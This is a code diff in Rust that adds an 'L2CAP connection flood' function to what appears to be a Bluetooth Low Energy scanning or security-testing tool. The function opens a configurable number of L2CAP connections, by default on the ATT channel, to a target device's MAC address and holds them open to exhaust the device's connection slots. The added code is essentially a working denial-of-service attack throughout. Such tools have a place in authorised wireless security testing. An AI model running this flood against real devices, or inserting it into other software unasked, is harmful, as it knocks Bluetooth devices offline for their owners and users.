@@ -331,6 +331,151 @@ fn now_ts() -> f64 {
 }
 
 // ---------------------------------------------------------------------------
+// L2CAP connection flood
+// ---------------------------------------------------------------------------
+
+/// Configuration for L2CAP connection flood.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct L2capFloodConfig {
+    pub mac: String,
+    /// Number of simultaneous connections to attempt
+    pub count: u32,
+    /// Duration in seconds to hold connections open
+    pub hold_secs: u32,
+    /// L2CAP PSM (Protocol Service Multiplexer) to target. 0 = ATT (default).
+    pub psm: u16,
+}
+
+/// Result of L2CAP flood operation.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct L2capFloodResult {
+    pub connections_opened: u32,
+    pub connections_failed: u32,
+    pub success: bool,
+    pub error: Option<String>,
+    pub timestamp: f64,
+}
+
+/// Open multiple L2CAP connections to a target device to exhaust its
+/// connection slots. Blocks for `hold_secs` then disconnects all.
+pub fn l2cap_flood(config: &L2capFloodConfig) -> L2capFloodResult {
+    let rt = match tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+    {
+        Ok(rt) => rt,
+        Err(e) => {
+            return L2capFloodResult {
+                connections_opened: 0,
+                connections_failed: 0,
+                success: false,
+                error: Some(format!("runtime error: {}", e)),
+                timestamp: now_ts(),
+            };
+        }
+    };
+
+    rt.block_on(async {
+        match run_l2cap_flood(config).await {
+            Ok(result) => result,
+            Err(e) => L2capFloodResult {
+                connections_opened: 0,
+                connections_failed: 0,
+                success: false,
+                error: Some(e),
+                timestamp: now_ts(),
+            },
+        }
+    })
+}
+
+async fn run_l2cap_flood(config: &L2capFloodConfig) -> Result<L2capFloodResult, String> {
+    let addr: Address = config
+        .mac
+        .parse()
+        .map_err(|e| format!("invalid MAC '{}': {}", config.mac, e))?;
+
+    let psm = if config.psm == 0 { 4 } else { config.psm }; // 4 = ATT
+
+    let sa = bluer::l2cap::SocketAddr {
+        addr,
+        addr_type: bluer::AddressType::LePublic,
+        psm,
+        cid: 0,
+    };
+
+    let mut opened = 0u32;
+    let mut failed = 0u32;
+    let mut sockets = Vec::new();
+
+    eprintln!("L2CAP flood: opening {} connections to {} (PSM {})",
+        config.count, config.mac, psm);
+
+    for i in 0..config.count {
+        match bluer::l2cap::Socket::new_stream() {
+            Ok(sock) => {
+                match tokio::time::timeout(
+                    Duration::from_secs(5),
+                    sock.connect(sa),
+                )
+                .await
+                {
+                    Ok(Ok(stream)) => {
+                        opened += 1;
+                        sockets.push(stream);
+                        if opened % 5 == 0 || i == config.count - 1 {
+                            eprintln!("L2CAP flood: {}/{} connections open", opened, i + 1);
+                        }
+                    }
+                    Ok(Err(e)) => {
+                        failed += 1;
+                        if failed <= 3 {
+                            eprintln!("L2CAP flood: connect #{} failed: {}", i + 1, e);
+                        }
+                    }
+                    Err(_) => {
+                        failed += 1;
+                        if failed <= 3 {
+                            eprintln!("L2CAP flood: connect #{} timed out", i + 1);
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                failed += 1;
+                if failed <= 3 {
+                    eprintln!("L2CAP flood: socket creation failed: {}", e);
+                }
+            }
+        }
+        // Small delay between connection attempts
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+
+    eprintln!(
+        "L2CAP flood: {} open, {} failed. Holding for {}s...",
+        opened, failed, config.hold_secs
+    );
+
+    if config.hold_secs > 0 {
+        tokio::time::sleep(Duration::from_secs(config.hold_secs as u64)).await;
+    }
+
+    // Drop all connections
+    let held = sockets.len();
+    drop(sockets);
+    eprintln!("L2CAP flood: released {} connections", held);
+
+    Ok(L2capFloodResult {
+        connections_opened: opened,
+        connections_failed: failed,
+        success: opened > 0,
+        error: None,
+        timestamp: now_ts(),
+    })
+}
+
+// ---------------------------------------------------------------------------
 // Active scanner (--active-scan)
 // ---------------------------------------------------------------------------
 
